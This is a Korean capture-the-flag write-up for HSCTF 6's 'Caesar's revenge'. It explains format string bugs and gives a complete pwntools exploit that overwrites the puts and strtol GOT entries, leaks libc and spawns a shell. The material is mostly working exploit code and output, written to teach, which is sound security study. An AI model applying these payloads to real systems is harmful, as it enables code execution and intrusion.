# [WriteUp]HSCTF 6 - Caesar's revenge

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

Format string attack의 교과서에 가까운 문제이다. %n을 활용할 수 있다면 그리 어렵지 않다.

---

```bash
gdb-peda$ pd main
Dump of assembler code for function main:
   0x0000000000401462 <+0>:	push   rbp
   0x0000000000401463 <+1>:	mov    rbp,rsp
   0x0000000000401466 <+4>:	sub    rsp,0x10
   0x000000000040146a <+8>:	mov    rax,QWORD PTR [rip+0x2bff]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401471 <+15>:	mov    esi,0x0
   0x0000000000401476 <+20>:	mov    rdi,rax
   0x0000000000401479 <+23>:	call   0x401060 <setbuf@plt>
   0x000000000040147e <+28>:	mov    eax,0x0
   0x0000000000401483 <+33>:	call   0x4010a0 <getegid@plt>
   0x0000000000401488 <+38>:	mov    DWORD PTR [rbp-0x4],eax
   0x000000000040148b <+41>:	mov    edx,DWORD PTR [rbp-0x4]
   0x000000000040148e <+44>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x0000000000401491 <+47>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401494 <+50>:	mov    esi,ecx
   0x0000000000401496 <+52>:	mov    edi,eax
   0x0000000000401498 <+54>:	mov    eax,0x0
   0x000000000040149d <+59>:	call   0x401050 <setresgid@plt>
   0x00000000004014a2 <+64>:	lea    rdi,[rip+0xc47]        # 0x4020f0
   0x00000000004014a9 <+71>:	call   0x401030 <puts@plt>
   0x00000000004014ae <+76>:	mov    eax,0x0
   0x00000000004014b3 <+81>:	call   0x401196 <caesar>
   0x00000000004014b8 <+86>:	mov    eax,0x0
   0x00000000004014bd <+91>:	leave  
   0x00000000004014be <+92>:	ret    
End of assembler dump.
```

```c
unsigned __int64 caesar()
{
  int v1; // [rsp+10h] [rbp-190h]
  int v2; // [rsp+14h] [rbp-18Ch]
  char *endptr; // [rsp+18h] [rbp-188h]
  char nptr; // [rsp+20h] [rbp-180h]
  char s[264]; // [rsp+90h] [rbp-110h]
  unsigned __int64 v6; // [rsp+198h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v1 = 0;
  LOBYTE(v2) = 0;
  printf("Enter text to be encoded: ");
  fgets(s, 250, stdin);
  printf("Enter number of characters to shift: ");
  while ( fgets(&nptr, 100, stdin) )
  {
    v2 = strtol(&nptr, &endptr, 10);
    if ( endptr != &nptr && *endptr == 10 && v2 > 0 )
      break;
    printf("Please enter an integer greater than 0 this time: ");
  }
  while ( s[v1] )
  {
    if ( s[v1] > 64 && s[v1] <= 90 )
      s[v1] = (char)(v2 + s[v1] - 65) % 26 + 65;
    if ( s[v1] > 96 && s[v1] <= 122 )
      s[v1] = (char)(v2 + s[v1] - 97) % 26 + 97;
    ++v1;
  }
  printf("Result: ");
  printf(s);
  puts("\nThank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!");
  return __readfsqword(0x28u) ^ v6;
}
```

코드를 보면, 카이사르 암호(Caesar cipher)를 만들어 주는 프로그램이다.

발생하는 취약점은 무엇이 있을까? 우선 입력받을 때는 모두 `fgets()`를 사용하고 있어서 buffer overflow를 방지하고 있다. 찾을 수 있는 취약점은 `printf(buf);`의 형식으로 발생하는 FSB뿐인 것 같다. 입력 함수로 arbitrary write가 가능한 부분이 보이지 않기 때문에 서식 문자 `%n`을 이용해서 어딘가에 뭔가를 써야 할 것 같다.

---

## Concept of format string attack

format string bug는 `printf()`를 호출할 때 서식 문자보다 인자의 개수가 적을 때 레지스터나 스택에 저장된 메모리가 유출되는 취약점이다. 서식 문자 중에는 `%n`이라는 특이한 녀석이 있다. 출력 함수인 `printf()`와는 어울리지 않게 값을 쓰는 역할을 한다. `%n` 이전에 출력된 문자의 개수를 기억하여 특정 주소에 적는다.  예를 들어 `printf("AAAA%n", p);`라는 코드는 `%n` 이전에 4개의 문자가 출력되기 때문에 p라는 주소가 가리키는 4바이트 공간에 4라는 값을 적는다. 2바이트의 공간을 이용하고 싶으면 `%hn`을 쓰면 되고, 8바이트의 공간을 이용하고 싶으면 `%ln`을 쓰면 된다.

64비트 운영체제에서는 함수의 매개변수가 스택보다 레지스터로 먼저 전달되기 때문에 `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` 다음에 `rsp`부터 8바이트씩 차례로 스택에 저장된 값을 출력할 수 있다. 멀리 있는 값에 접근하기 위해서는 `%10$x`처럼 8바이트씩 몇 번 점프할 것인지 써 주면 된다. 예를 들어 `%x%x%x%x` 대신 `%4$x`를 쓰면 되고, `%x%x%x%x%n` 대신 `%5$n`을 쓰면 된다.

결국, 스택에 원하는 값을 저장해 놓고 `rsp`와 얼마나 떨어져 있는지만 알면 원하는 주소에 그 값을 적어넣을 수 있는 것이다.

---

일단 먼저 떠오를 수 있는 방법은 `caesar()`의 return address를 조작하는 것인데, 바이너리 안에 `system("/bin/sh")`라는 형식은 없기 때문에 어려울 것 같다. `system()`의 주소와 `"/bin/sh"`의 주소를 알아내서 `"/bin/sh"`를 인자로 준 후에 `system()`을 호출해야 하기 때문에 한 번의 실행으로는 해결할 수 없다.

다른 방법으로는 GOT overwrite를 수행하는 것이 있다. 우선 `puts()`의 GOT에 `caesar()`의 시작 주소를 써서 프로그램이 반복되도록 만들 수 있다. 그리고 서식 문자 `%s`로 libc를 leak하여 `system()`의 주소를 구하고, `strtol()`의 GOT에 `system()`의 주소를 overwrite하면 `strtol()` 대신 `system()`이 실행될 것이다. shift key를 입력받고 그 입력을 인자로 받아서 `strtol()`이 실행되기 때문에 shift key에 `"/bin/sh"` 를 입력해 주면 쉘을 얻을 수 있을 것이다.

---

우선 입력한 평문이 스택에서 어느 위치에 들어가는지 확인해야 한다.

```bash
gdb-peda$ r
Starting program: /home/chykor12/HSCTF 6/caesar_revenge 
Welcome to the Caesar Cipher Encoder!
Enter text to be encoded: AAAAAAAA
Enter number of characters to shift: 26 
Result:
```

shift key에 26을 넣으면 알파벳은 한 바퀴 돌아서 제자리로 돌아오기 때문에 평문이 변하지 않는다.

```bash
gdb-peda$ x/60gx $rsp
0x7fffffffddc0:	0x0000000000000002	0x800000000000000e
0x7fffffffddd0:	0x0000001a00000009	0x00007fffffffdde2
0x7fffffffdde0:	0x00000000000a3632	0x0000000000000000
0x7fffffffddf0:	0x0000000000000000	0x0000000000000000
0x7fffffffde00:	0x00007fffffffdee0	0x0000000000000000
0x7fffffffde10:	0x00007ffff7ffe738	0x0000000000000000
0x7fffffffde20:	0x0000000000000001	0x00007ffff7ffe710
0x7fffffffde30:	0x0000000000000000	0x000000006562b026
0x7fffffffde40:	0x00007ffff7ffea98	0x00007fffffffdf88
0x7fffffffde50:	0x4141414141414141	0x00007ffff7ff000a
0x7fffffffde60:	0x0000000000000000	0x00007ffff7de01ef
0x7fffffffde70:	0x0000000000000000	0x00007fffffffdfc0
0x7fffffffde80:	0x0000000000000000	0x0000000000000000
0x7fffffffde90:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdea0:	0x00007ffff7b97787	0x00007ffff7a6f1bd
0x7fffffffdeb0:	0x00007fffffffdee0	0x00007ffff7dd0760
0x7fffffffdec0:	0x0000000000000d68	0x0000000000000001
0x7fffffffded0:	0x00007ffff7dd07e3	0x00007ffff7a70f51
0x7fffffffdee0:	0x00000000004020f0	0x00007ffff7dd0760
0x7fffffffdef0:	0x000000000000000a	0x00000000004020f0
0x7fffffffdf00:	0x00007ffff7dcc2a0	0x0000000000000000
0x7fffffffdf10:	0x0000000000000000	0x00007ffff7a71403
0x7fffffffdf20:	0x0000000000000025	0x00007ffff7dd0760
0x7fffffffdf30:	0x00000000004020f0	0x00007ffff7a64b62
0x7fffffffdf40:	0x00000000000000c2	0x0000000000000000
0x7fffffffdf50:	0x00007fffffffdf80	0x4eb51440eb110600
0x7fffffffdf60:	0x00007fffffffdf80	0x00000000004014b8
0x7fffffffdf70:	0x00007fffffffe060	0x000003e800000000
0x7fffffffdf80:	0x00000000004014c0	0x00007ffff7a05b97
0x7fffffffdf90:	0x0000000000000001	0x00007fffffffe068
```

버퍼는 `$rsp+0x50`부터 시작됨을 확인할 수 있다. 그러면 format string bug를 발생시켰을 때 `rsi`, `rdx`, `rcx`, `r8`, `r9` 부터 출력된 다음 스택에서 `rsp`에서부터 8바이트씩 출력되기 시작하여 19번째로 평문이 출력될 것이다. 즉, 24개의 서식 문자를 쓰면 버퍼에 접근할 수 있다. 확인해 보자.

```bash
gdb-peda$ r
Starting program: /home/chykor12/HSCTF 6/caesar_revenge 
Welcome to the Caesar Cipher Encoder!
Enter text to be encoded: AAAAAAAA%24$lx
Enter number of characters to shift: 26
Result: AAAAAAAA4141414141414141
```

정확히 우리가 원하는 위치의 값이 출력되었다.

---

이제 공격을 수행해 보자. 먼저 `puts()`의 GOT주소에 `caesar()`의 시작 주소를 넣을 것이다. 스택에 `puts()`의 GOT 주소를 적어 두고, 스택의 그 위치로 접근하여 `%n`을 사용하면 된다.

```python
# exploit_caesar_revenge.py

from pwn import *

e = ELF("./caesar_revenge")

addr_puts_got = e.got["puts"] # GOT address of puts()
addr_strtol_got = e.got["strtol"] # GOT address of strtol()
addr_caesar = 0x401196 # address of caesar()

p = process("./caesar_revenge")

# make loop
payload = "%" + str(addr_caesar) + "x%26$ln"
payload = payload.ljust(16, ' ')
payload += p64(addr_puts_got)

p.sendlineafter("encoded: ", payload)
p.recvuntil("shift: ")
pause()
p.sendline("26")

p.interactive()
```

`%26%$ln` 이전에 `addr_caesar` 만큼의 문자가 출력되기 때문에, `addr_puts_got`이 가리키는 8바이트의 메모리 공간에 `addr_caesar`가 입력될 것이다. `pause()`가 걸린 상태에서 gdb에 attach하고, 암호문을 출력하는 `printf()`가 실행되기 전후의 메모리를 비교해 보자. 실행되기 전의 메모리는 다음과 같다.

```bash
gdb-peda$ x/gx 0x404018
0x404018:	0x00007f0ec7d9f9c0
gdb-peda$ print puts
$1 = {int (const char *)} 0x7f0ec7d9f9c0 <_IO_puts>
```

GOT에 `puts()`의 주소가 잘 들어가 있다. `printf()`가 실행되고 난 후의 메모리는 다음과 같다.

```bash
gdb-peda$ x/gx 0x404018
0x404018:	0x0000000000401196
```

GOT가 성공적으로 overwrite되었다! 이제 `caesar()`가 반복해서 실행될 것이다.

---

이번에는 libc의 주소를 leak할 것이다. 링크된 임의의 라이브러리 함수의 GOT 주소를 스택에 적어 두고, 그 위치로 접근하여 `%s`를 써서 GOT에 저장된 값을 뽑아낼 것이다. 물론 `puts()`의 GOT는 이미 overwrite되었기 때문에 사용할 수 없다. `strtol()`을 이용해서 릭을 수행해 보자.

```python
# exploit_caesar_revenge.py

from pwn import *

e = ELF("./caesar_revenge")

addr_puts_got = e.got["puts"] # GOT address of puts()
addr_strtol_got = e.got["strtol"] # GOT address of strtol()
addr_caesar = 0x401196 # address of caesar()
offset_strtol = 0x45110 # offset of strtol() from libc base
offset_system = 0x4f440 # offset of system() from libc base

p = process("./caesar_revenge")

# make loop
payload = "%" + str(addr_caesar) + "x%26$ln"
payload = payload.ljust(16, ' ')
payload += p64(addr_puts_got)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

# libc leak
payload = "%25$s".ljust(8, ' ')
payload += p64(addr_strtol_got)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

p.recvuntil("Result: ")
addr_strtol = u64(p.recv(6).ljust(8, '\x00')) # address of strtol()
log.info("address of strtol(): " + hex(addr_strtol) + ", " + str(addr_strtol))
addr_libc = addr_strtol - offset_strtol # address of libc base
log.info("address of libc base: " + hex(addr_libc) + ", " + str(addr_libc))
addr_system = addr_libc + offset_system # address of system()
log.info("address of system(): " + hex(addr_system) + ", " + str(addr_system))

pause()
```

간단하게 릭을 수행할 수 있다. 딱히 설명할 건 없을 것 같다. 실행 결과는 다음과 같다.

```bash
chykor12@ubuntu:~/HSCTF 6$ python exploit_caesar_revenge.py
[*] '/home/chykor12/HSCTF 6/caesar_revenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './caesar_revenge': pid 2841
[*] address of strtol(): 0x7f919f63e110, 140263421108496
[*] address of libc base: 0x7f919f5f9000, 140263420825600
[*] address of system(): 0x7f919f648440, 140263421150272
[*] Paused (press any to continue)
```

---

이번에는 `strtol()`의 GOT에 `system()`의 주소를 넣을 것이다. 위의 결과를 보면, 두 함수의 주소의 앞의 2바이트는 다를 수 없기 때문에 뒤의 4바이트만 바꿔 주면 된다. 4바이트를 한번에 쓰면 상당히 비효율적이므로 2바이트씩 나눠서 쓰자. `%hn`을 사용하면 2바이트 공간에 값을 쓸 수 있다.

```python
# exploit_caesar_revenge.py

from pwn import *

e = ELF("./caesar_revenge")

addr_puts_got = e.got["puts"] # GOT address of puts()
addr_strtol_got = e.got["strtol"] # GOT address of strtol()
addr_caesar = 0x401196 # address of caesar()
offset_strtol = 0x45110 # offset of strtol() from libc base
offset_system = 0x4f440 # offset of system() from libc base

p = process("./caesar_revenge")

# make loop
payload = "%" + str(addr_caesar) + "x%26$ln"
payload = payload.ljust(16, ' ')
payload += p64(addr_puts_got)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

# libc leak
payload = "%25$s".ljust(8, ' ')
payload += p64(addr_strtol_got)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

p.recvuntil("Result: ")
addr_strtol = u64(p.recv(6).ljust(8, '\x00')) # address of strtol()
log.info("address of strtol(): " + hex(addr_strtol) + ", " + str(addr_strtol))
addr_libc = addr_strtol - offset_strtol # address of libc base
log.info("address of libc base: " + hex(addr_libc) + ", " + str(addr_libc))
addr_system = addr_libc + offset_system # address of system()
log.info("address of system(): " + hex(addr_system) + ", " + str(addr_system))

addr_system_first = addr_system & 0xffff
addr_system_second = (addr_system & 0xffff0000) >> 16

# strtol@GOT -> system()
payload = "%" + str(addr_system_first) + "x%28$hn"
payload += "%" + str(addr_system_second + 0x10000 - addr_system_first) + "x%29$hn"
payload = payload.ljust(32, ' ')
payload += p64(addr_strtol_got)
payload += p64(addr_strtol_got + 2)

p.sendlineafter("encoded: ", payload)
p.recvuntil("shift: ")
pause()
p.sendline("26")

p.interactive()
```

`addr_system_first`는 `addr_system`의 뒤 2바이트이고, `addr_system_second`는 중간 2바이트가 된다. 이때 유의해야 할 것은 두 번째 `%hn`이 앞의 `addr_system_first`만큼의 출력도 포함하여 개수를 센다는 것이다. 그래서 `addr_system_second`에서 `addr_system_first`를 빼 주어야 한다. 그런데 음수가 될 수 있기 때문에 `0x10000`을 더해 주었다. `%hn`은 그 전까지의 출력이 `0xffff`보다 크면 하위 2바이트만을 적기 때문에 `0x10000`을 더하는 것은 결과에 나쁜 영향을 미치지 않는다.

위에서처럼 `pause()`가 걸린 상태에서 `printf()`가 실행되기 전후의 메모리를 비교해 보자.

```bash
chykor12@ubuntu:~/HSCTF 6$ python exploit_caesar_revenge.py
[*] '/home/chykor12/HSCTF 6/caesar_revenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './caesar_revenge': pid 2895
[*] address of strtol(): 0x7fcd471c2110, 140519638049040
[*] address of libc base: 0x7fcd4717d000, 140519637766144
[*] address of system(): 0x7fcd471cc440, 140519638090816
[*] Paused (press any to continue)
[*] Switching to interactive mode
Result: $
```

`printf()`가 실행되기 전의 메모리는 다음과 같다.

```bash
gdb-peda$ x/gx 0x404048
0x404048:	0x00007fcd471c2110
```

`strtol()`의 GOT에 값이 잘 들어가 있다. `printf()`가 실행된 후의 메모리는 다음과 같다.

```bash
gdb-peda$ x/gx 0x404048
0x404048:	0x00007fcd471cc440
```

`system()`의 주소가 적힌 것을 확인할 수 있다! 이제 인자로 `"/bin/sh"`만 입력해 주면 쉘을 획득할 수 있을 것이다.

---

최종 익스플로잇은 다음과 같다.

```python
# exploit_caesar_revenge.py

from pwn import *

e = ELF("./caesar_revenge")

addr_puts_got = e.got["puts"] # GOT address of puts()
addr_strtol_got = e.got["strtol"] # GOT address of strtol()
addr_caesar = 0x401196 # address of caesar()
offset_strtol = 0x45110 # offset of strtol() from libc base
offset_system = 0x4f440 # offset of system() from libc base

p = process("./caesar_revenge")

# make loop
payload = "%" + str(addr_caesar) + "x%26$ln"
payload = payload.ljust(16, ' ')
payload += p64(addr_puts_got)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

# libc leak
payload = "%25$s".ljust(8, ' ')
payload += p64(addr_strtol_got)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

p.recvuntil("Result: ")
addr_strtol = u64(p.recv(6).ljust(8, '\x00')) # address of strtol()
log.info("address of strtol(): " + hex(addr_strtol) + ", " + str(addr_strtol))
addr_libc = addr_strtol - offset_strtol # address of libc base
log.info("address of libc base: " + hex(addr_libc) + ", " + str(addr_libc))
addr_system = addr_libc + offset_system # address of system()
log.info("address of system(): " + hex(addr_system) + ", " + str(addr_system))

addr_system_first = addr_system & 0xffff
addr_system_second = (addr_system & 0xffff0000) >> 16

# strtol@GOT -> system()
payload = "%" + str(addr_system_first) + "x%28$hn"
payload += "%" + str(addr_system_second + 0x10000 - addr_system_first) + "x%29$hn"
payload = payload.ljust(32, ' ')
payload += p64(addr_strtol_got)
payload += p64(addr_strtol_got + 2)

p.sendlineafter("encoded: ", payload)
p.sendlineafter("shift: ", "26")

# system("/bin/sh")
p.sendlineafter("encoded: ", "A")
p.sendlineafter("shift: ", "/bin/sh")

p.interactive()
```

```bash
chykor12@ubuntu:~/HSCTF 6$ python exploit_caesar_revenge.py
[*] '/home/chykor12/HSCTF 6/caesar_revenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './caesar_revenge': pid 2918
[*] address of strtol(): 0x7f4786c51110, 139945180467472
[*] address of libc base: 0x7f4786c0c000, 139945180184576
[*] address of system(): 0x7f4786c5b440, 139945180509248
[*] Switching to interactive mode
$ whoami
chykor12
```
